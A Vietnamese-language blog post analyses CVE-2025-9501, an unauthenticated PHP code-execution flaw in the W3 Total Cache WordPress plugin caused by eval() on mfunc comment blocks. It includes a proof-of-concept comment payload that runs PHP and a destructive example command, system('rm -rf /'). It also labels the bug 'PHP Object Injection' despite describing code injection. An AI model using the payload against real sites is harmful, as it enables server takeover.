---
title: CVE-2025-9501 Analysis & POC
description: Security Vulnerability in WordPress W3 Total Cache Plugin.
date: 2025-11-22 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, remote code execution]
images: ["app.jpg"]
featuredImage: "app.jpg"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin W3 Total Cache WordPress trước phiên bản 2.8.13 tồn tại lỗ hổng command injection thông qua hàm _parse_dynamic_mfunc, cho phép người dùng chưa xác thực thực thi các lệnh PHP bằng cách gửi một comment chứa payload độc hại vào bài viết.

* **CVE ID**: [CVE-2025-9501](https://www.cve.org/CVERecord?id=CVE-2025-9501)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 2.8.12
* **Patched Versions**: 2.8.13
* **CVSS severity**: High (9)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress W3 Total Cache Plugin](https://wordpress.org/plugins/w3-total-cache/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **W3 Total Cache**:  
    * `2.8.12` – **vulnerable**  
    * `2.8.13` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
Theo như mô tả, lỗ hổng xuất phát từ hàm `_parse_dynamic_mfunc`

```php {title="PgCache_ContentGrabber.php v2.8.12" data-open=true hl_lines=[11]}
public function _parse_dynamic_mfunc( $matches ) {
    $code1 = trim( $matches[1] );
    $code2 = trim( $matches[2] );
    $code  = ( $code1 ? $code1 : $code2 );

    if ( $code ) {
        $code = trim( $code, ';' ) . ';';

        try {
            ob_start();
            $result = eval( $code );
            $output = ob_get_contents();
            ob_end_clean();
        } catch ( \Exception $ex ) {
            $result = false;
        }

        if ( false === $result ) {
            $output = sprintf( 'Unable to execute code: %s', htmlspecialchars( $code ) );
        }
    } else {
        $output = htmlspecialchars( 'Invalid mfunc tag syntax. The correct format is: <!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --><!-- /mfunc W3TC_DYNAMIC_SECURITY --> or <!-- W3TC_DYNAMIC_SECURITY mfunc -->PHP code<!-- /mfunc W3TC_DYNAMIC_SECURITY -->.' );
    }

    return $output;
}
```

Hàm `eval()` xuất hiện tại dòng 11. Nó là một hàm rất đặc biệt và nguy hiểm vì nó cho phép thực thi một chuỗi PHP như là code thực sự. Ví dụ:
 
```php
$command = 'system("rm -rf /")';
eval($command);
```

## Analysis

Khi plugin được install và active, nó sẽ thêm vào đầu dòng của `wp-config.php`

```php
<?php
/** Enable W3 Total Cache */
define('WP_CACHE', true); // Added by W3 Total Cache
...
```

Dùng để đăng kí tính năng cache cho WordPress. `WP_CACHE` được gọi trong `wp-settings.php`

```php {title="wp-settings.php" data-open=true hl_lines=[1]}
if ( WP_CACHE && apply_filters( 'enable_loading_advanced_cache_dropin', true ) && file_exists( WP_CONTENT_DIR . '/advanced-cache.php' ) ) {
	// For an advanced caching plugin to use. Uses a static drop-in because you would only want one.
	include WP_CONTENT_DIR . '/advanced-cache.php';

	// Re-initialize any hooks added manually by advanced-cache.php.
	if ( $wp_filter ) {
		$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );
	}
}
```

WordPress sẽ tự động load file `advanced-cache.php` nếu nó tồn tại. Khi plugin được active thì nó đã tạo ra file này:

```php {title="advanced-cache.php" data-open=true hl_lines=[40,42]}
<?php
/**
 * File: advanced-cache.php
 *
 * W3 Total Cache advanced cache module.
 *
 * @package W3TC
 */

defined( 'ABSPATH' ) || die();

global $w3tc_start_microtime;
$w3tc_start_microtime = microtime( true );

/**
 * Abort W3TC loading if WordPress is upgrading.
 */
if ( defined( 'WP_INSTALLING' ) && WP_INSTALLING ) {
	return;
}

if ( ! defined( 'W3TC_IN_MINIFY' ) ) {
	if ( ! defined( 'W3TC_DIR' ) ) {
		define( 'W3TC_DIR', ( defined( 'WP_PLUGIN_DIR' ) ? WP_PLUGIN_DIR : WP_CONTENT_DIR . '/plugins' ) . '/w3-total-cache' );
	}

	if ( ! @is_dir( W3TC_DIR ) || ! file_exists( W3TC_DIR . '/w3-total-cache-api.php' ) ) {
		if ( defined( 'WP_ADMIN' ) ) {
			// Only display errors in wp-admin.
			printf( '<strong>W3 Total Cache Error:</strong> some files appear to be missing or out of place. Please re-install plugin or remove <strong>%s</strong>. <br />', __FILE__ );
		}
	} else {
		require_once W3TC_DIR . '/w3-total-cache-api.php';

		if ( class_exists( '\W3TC\Dispatcher' ) ) {
			$w3tc_redirect = \W3TC\Dispatcher::component( 'Mobile_Redirect' );
			$w3tc_redirect->process();

			$w3tc_config = \W3TC\Dispatcher::config();
			if ( $w3tc_config->get_boolean( 'pgcache.enabled' ) ) {
				$o = \W3TC\Dispatcher::component( 'PgCache_ContentGrabber' );
				$o->process();
			}
		}
	}
}
```

Khi tính năng page cache (`pgcache`) được bật thì `$o->process()` để xử lí logic của page cache.

![Page Cache](page_cache.png "Enable page cache")

Trong `process()`, plugin chuẩn bị cơ chế can thiệp vào nội dung trang trước khi trả về cho trình duyệt.

```php {title="PgCache_ContentGrabber.php v2.8.12" data-open=true hl_lines=[5]}
public function process() {
    $this->run_extensions_dropin();
    // Skip caching for some pages.
    ...
    Util_Bus::add_ob_callback( 'pagecache', array( $this, 'ob_callback' ) );
}
```

Tại dòng cuối, hàm gọi:

```php {title="PgCache_ContentGrabber.php v2.8.12" data-open=true hl_lines=[5]}
Util_Bus::add_ob_callback( 'pagecache', array( $this, 'ob_callback' ) );
```

Điều này có nghĩa là:

* Plugin đăng ký một callback tên `pagecache`.
* Callback thực tế là phương thức `ob_callback` của object hiện tại.
* Callback này sẽ được gọi **sau khi WordPress sinh xong HTML**, để plugin có cơ hội xử lý (như tối ưu, nén, ghi cache…) trước khi gửi cho trình duyệt.

Hàm `add_ob_callback()` chỉ làm nhiệm vụ lưu callback lại để sử dụng về sau:

```php {title="Util_Bus.php v2.8.12" data-open=true hl_lines=[2]}
public static function add_ob_callback( $key, $callback ) {
    $GLOBALS['_w3tc_ob_callbacks'][ $key ] = $callback;
}
```

Hàm `ob_callback()` này được gọi khi output buffer xả nội dung HTML ra, và nó kiểm tra xem trang có “nội dung động” hay không:

```php {title="PgCache_ContentGrabber.php v2.8.12" data-open=true hl_lines=[3,6,14]}
public function ob_callback( $buffer ) {
    ...
    $has_dynamic = $this->_has_dynamic( $buffer );
    ...
    // We can't capture output in ob_callback so we use shutdown function.
    if ( $has_dynamic ) {
        $this->_shutdown_buffer = $buffer;

        $buffer = '';

        register_shutdown_function(
            array(
                $this,
                'shutdown',
            )
        );
    }

    return $buffer;
}
```

1. `$buffer` là toàn bộ HTML mà WordPress vừa tạo ra.
2. `_has_dynamic()` kiểm tra xem trong HTML có phần nào **không thể cache trực tiếp**, tức nó không được cố định:
```php {title="PgCache_ContentGrabber.php v2.8.12" data-open=true hl_lines=[]}
public function _has_dynamic( $buffer ) {
    if ( ! defined( 'W3TC_DYNAMIC_SECURITY' ) ) {
        return false;
    }

    return preg_match(
        '~<!--\s*m(func|clude)\s*' . W3TC_DYNAMIC_SECURITY . '(.*)-->(.*)<!--\s*/m(func|clude)\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->~Uis',
        $buffer
    );
}
```
Theo như [tài liệu](https://1fix.io/blog/2015/02/22/page-fragment-caching-w3-total-cache/) tôi tìm được thì `W3TC_DYNAMIC_SECURITY` sẽ được cấu hình trong `wp-config.php` nếu muốn sử dụng `page fragment caching`.
```php
define('W3TC_DYNAMIC_SECURITY', 'W3TC_DYNAMIC_SECURITY_VALUE');
```
Nội dung động sẽ có dạng:
```php
<!-- mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --> PHP code <!-- /mfunc{W3TC_DYNAMIC_SECURITY_VALUE} -->
or
<!-- mclude{W3TC_DYNAMIC_SECURITY_VALUE} --> PHP code <!-- /mclude{W3TC_DYNAMIC_SECURITY_VALUE} -->
```

3. Nếu **không có nội dung động**, hàm trả về `$buffer` bình thường để có thể ghi cache ngay.
4. Nếu **có nội dung động**:

   * Toàn bộ HTML được lưu lại vào `$this->_shutdown_buffer`
   * Hàm trả về chuỗi rỗng (tạm thời không xuất gì ra)
   * Plugin đăng ký `register_shutdown_function()` để gọi phương thức `shutdown()` sau khi PHP kết thúc chạy toàn bộ request
     ⇒ Việc xử lý HTML bị dời sang cuối cùng, sau khi mọi nội dung động đã sẵn sàng.

```php {title="PgCache_ContentGrabber.php v2.8.12" data-open=true hl_lines=[5]}
public function shutdown() {
    $compression = $this->_page_key_extension['compression'];

    // Parse dynamic content.
    $buffer = $this->_parse_dynamic( $this->_shutdown_buffer );

    // Compress page according to headers already set.
    $compressed_buffer = $this->_compress( $buffer, $compression );

    echo $compressed_buffer; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
}
```

`shutdown` sẽ gọi đến `_parse_dynamic()` để Xử lý các khối động trong HTML - tìm trong toàn bộ HTML các khối đánh dấu nội dung động của W3TC và thay thế chúng bằng kết quả thực tế:

```php {title="PgCache_ContentGrabber.php v2.8.12" data-open=true hl_lines=[7,10]}
public function _parse_dynamic( $buffer ) {
    if ( ! defined( 'W3TC_DYNAMIC_SECURITY' ) ) {
        return $buffer;
    }

    $buffer = preg_replace_callback(
        '~<!--\s*mfunc\s*' . W3TC_DYNAMIC_SECURITY . '(.*)-->(.*)<!--\s*/mfunc\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->~Uis',
        array(
            $this,
            '_parse_dynamic_mfunc',
        ),
        $buffer
    );

    $buffer = preg_replace_callback(
        '~<!--\s*mclude\s*' . W3TC_DYNAMIC_SECURITY . '(.*)-->(.*)<!--\s*/mclude\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->~Uis',
        array(
            $this,
            '_parse_dynamic_mclude',
        ),
        $buffer
    );

    return $buffer;
}
```

* Nếu hằng `W3TC_DYNAMIC_SECURITY` chưa tồn tại → trả về nguyên HTML, coi như không có nội dung động.

* Nếu có, hàm lần lượt chạy hai `preg_replace_callback()`:

  1. Tìm các cặp ghi chú dạng:

     ```
     <!-- mfunc{security} --> ... <!-- /mfunc{security} -->
     ```

     và gọi `_parse_dynamic_mfunc()` để xử lý nội dung bên trong.

  2. Tìm các cặp ghi chú:

     ```
     <!-- mclude{security} --> ... <!-- /mclude{security} -->
     ```

     và gọi `_parse_dynamic_mclude()` để xử lý tương tự.

* Mỗi callback sẽ nhận đoạn HTML khớp với regex và trả về kết quả động đã được chạy.

Kết quả cuối cùng là `$buffer` với các khối mfunc/mclude đã được thay thế bằng nội dung thực, sẵn sàng để nén và xuất ra cho người dùng.

## Flow

{{< mermaid >}}
graph TD

A["User requests any front‑end page (unauthenticated)"]
--> B["WordPress loads wp-settings.php"]

B --> C["WP_CACHE = true → Load advanced-cache.php"]
C --> D["advanced-cache.php runs Dispatcher"]
D --> E["PgCache_ContentGrabber->process()"]

E --> F["Util_Bus::add_ob_callback('pagecache', 'ob_callback')"]
F --> G["WordPress renders full HTML into output buffer"]
G --> H["ob_callback($buffer) triggered"]

H --> I{"_has_dynamic($buffer) ?"}
I -->|No| J["Return buffer as-is → Serve cached page"]
I -->|Yes| K["Save buffer to _shutdown_buffer"]
K --> L["register_shutdown_function(shutdown)"]
L --> M["After request completes → shutdown()"]

M --> N["_parse_dynamic(_shutdown_buffer)"]

N --> O{"HTML contains <!-- mfunc ... --> ?"}
O -->|Yes| P["_parse_dynamic_mfunc()"]
P --> Q["Extract payload from comment and run eval()"]

O -->|Or mclude| R["_parse_dynamic_mclude() (include type)"]

Q --> S["Output replaced with execution result"]
R --> S

S --> T["Page optionally compressed"]
T --> U["echo back to user"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Install và active plugin, hàm thành bước setup cơ bản
2. Bật tùy chọn Page Cache
3. Cấu `W3TC_DYNAMIC_SECURITY` trong `wp-config.php`
4. Comment một post bất kì với content :

```php
<!-- mfuncvalue -->phpinfo();<!-- /mfuncvalue -->
```

![Result](result.png "Kết quả")

> [!NOTE]
> Giá trị của `W3TC_DYNAMIC_SECURITY` có thể bị lộ khi quên bật tính năng Page Cache mà sử dụng nó ở nơi Unauthenticated User có thể thấy được.
> ![Miss Page Cache](miss_page_cache.png "Sử dụng khi quên bật Page Cache")

# Conclusion

Lỗ hổng CVE-2025-9501 xuất phát từ việc plugin W3 Total Cache sử dụng `eval()` để xử lý các khối “dynamic fragment caching” (`<!-- mfunc ... -->`) mà không có bất kỳ bước xác thực, lọc hoặc sandbox nào. Điều này cho phép kẻ tấn công chưa xác thực có thể chèn trực tiếp mã PHP vào nội dung trang, và mã này sẽ được thực thi trong giai đoạn `shutdown`, sau khi WordPress đã kết thúc toàn bộ xử lý chính, dẫn đến Remote Code Execution (RCE).

Vấn đề càng nghiêm trọng hơn khi logic cache và xử lý đầu ra nằm ngoài vòng đời chuẩn của WordPress, khiến các lớp bảo vệ như hook, nonce hoặc kiểm tra quyền truy cập không còn hiệu lực. W3TC 2.8.13 đã loại bỏ việc gọi `eval()` trong cơ chế xử lý động, chính thức vá lỗ hổng này.

# Key Takeaways

* Việc sử dụng `eval()` trong sản phẩm production gần như luôn dẫn đến RCE nếu đầu vào không được kiểm soát nghiêm ngặt.
* Plugin đã xử lý nội dung động **sau toàn bộ vòng đời WordPress**, khiến nhiều lớp bảo vệ của core bị bypass.
* Page Fragment Caching của W3TC cho phép chạy code PHP từ HTML comment – chỉ cần một cấu hình sai hoặc thiếu chặn đầu vào là đủ cho tấn công.
* RCE được kích hoạt trong `register_shutdown_function()`, khiến payload chạy ở thời điểm cuối của request – khó bị phát hiện bởi quá trình phân tích thông thường.
* Cập nhật plugin ngay lập tức là cách bảo vệ duy nhất trong trường hợp hệ thống vẫn đang sử dụng <= 2.8.12.
* Đối với mọi hệ thống PHP, **tuyệt đối tránh `eval()` nếu không có sandbox và validation cực kỳ chặt**.

## References

[Command Injection](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)

[WordPress W3 Total Cache Plugin < 2.8.13 is vulnerable to Remote Code Execution (RCE)](https://patchstack.com/database/wordpress/plugin/w3-total-cache/vulnerability/wordpress-w3-total-cache-plugin-2-8-13-unauthenticated-command-injection-vulnerability)     